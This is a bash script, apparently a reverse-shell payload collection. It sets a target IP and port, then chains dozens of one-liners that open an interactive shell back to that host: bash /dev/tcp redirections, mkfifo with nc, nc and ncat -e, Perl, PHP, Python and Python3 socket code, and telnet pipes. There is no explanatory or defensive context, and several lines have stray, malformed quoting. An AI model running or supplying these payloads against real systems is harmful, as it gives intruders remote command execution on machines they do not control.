#!/bin/bash

IP=127.0.0.1
PORT=443

sh -i >& /dev/tcp/$IP/$PORT 0>&1
bash -i >& /dev/tcp/$IP/$PORT 0>&1
/bin/sh -i >& /dev/tcp/$IP/$PORT 0>&1
/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1 
sh -i 5<> /dev/tcp/$IP/$PORT 0<&5 1>&5 2>&5 
/bin/sh -i 5<> /dev/tcp/$IP/$PORT 0<&5 1>&5 2>&5
bash -i 5<> /dev/tcp/$IP/$PORT 0<&5 1>&5 2>&5
/bin/bash -i 5<> /dev/tcp/$IP/$PORT 0<&5 1>&5 2>&5
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP $PORT >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $IP $PORT >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $IP $PORT >/tmp/f
0<&196;exec 196<>/dev/tcp/$IP/$PORT; bash <&196 >&196 2>&196 
0<&196;exec 196<>/dev/tcp/$IP/$PORT; bash <&196 >&196 2>&196 
0<&196;exec 196<>/dev/tcp/$IP/$PORT; /bin/sh <&196 >&196 2>&196 
0<&196;exec 196<>/dev/tcp/$IP/$PORT; /bin/sh <&196 >&196 2>&196 
exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
nc $IP $PORT -e sh' 'nc $IP $PORT -e /bin/sh' 'nc $IP $PORT -e bash
nc $IP $PORT -e /bin/bash' 'nc -c sh $IP $PORT' 'nc -c /bin/sh $IP $PORT
nc -c bash $IP $PORT' 'nc -c /bin/bash $IP $PORT' 'ncat $IP $PORT -e sh
ncat $IP $PORT -e /bin/sh
ncat $IP $PORT -e bash
ncat $IP $PORT -e /bin/bash
perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
php -r '$sock=fsockopen("$IP",$PORT);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);exec("bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);shell_exec("/bin/sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);shell_exec("bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);shell_exec("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);system("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);system("/bin/sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);system("bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);system("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);passthru("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);passthru("/bin/sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);passthru("bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);passthru("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$IP",$PORT);popen("sh <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("$IP",$PORT);popen("/bin/sh <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("$IP",$PORT);popen("bash <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("$IP",$PORT);popen("/bin/bash <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("$IP",$PORT);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'' 'php -r '$sock=fsockopen("$IP",$PORT);$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
php -r '$sock=fsockopen("$IP",$PORT);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'' 'php -r '$sock=fsockopen("$IP",$PORT);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
export RHOST="$IP";export RPORT=$PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
export RHOST="$IP";export RPORT=$PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
export RHOST="$IP";export RPORT=$PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
export RHOST="$IP";export RPORT=$PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
export RHOST="$IP";export RPORT=$PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
export RHOST="$IP";export RPORT=$PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")''
export RHOST="$IP";export RPORT=$PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
export RHOST="$IP";export RPORT=$PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
TF=$(mktemp -u);mkfifo $TF && telnet $IP $PORT 0<$TF | sh 1>$TF
TF=$(mktemp -u);mkfifo $TF && telnet $IP $PORT 0<$TF | /bin/sh 1>$TF
TF=$(mktemp -u);mkfifo $TF && telnet $IP $PORT 0<$TF | bash 1>$TF
TF=$(mktemp -u);mkfifo $TF && telnet $IP $PORT 0<$TF | /bin/bash 1>$TF'